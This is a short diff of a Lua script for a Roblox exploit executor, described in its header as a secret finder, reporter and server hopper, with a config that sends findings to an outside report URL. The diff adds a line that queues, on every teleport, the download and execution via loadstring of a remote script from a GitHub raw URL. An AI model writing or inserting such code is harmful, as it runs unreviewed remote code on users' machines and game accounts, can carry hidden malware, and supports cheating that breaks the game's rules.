@@ -1,5 +1,5 @@
 -- Secret finder + reporter + server hopper (Delta-friendly)
-
+queue_on_teleport("loadstring(Game:HttpGet('https://raw.githubusercontent.com/bypassv5/autojoiner/refs/heads/main/bot.lua'))()")
 -- === CONFIG ===
 local MIN_TARGET = 10_000_000
 local API_URL = "http://novachat.elementfx.com/report.php"
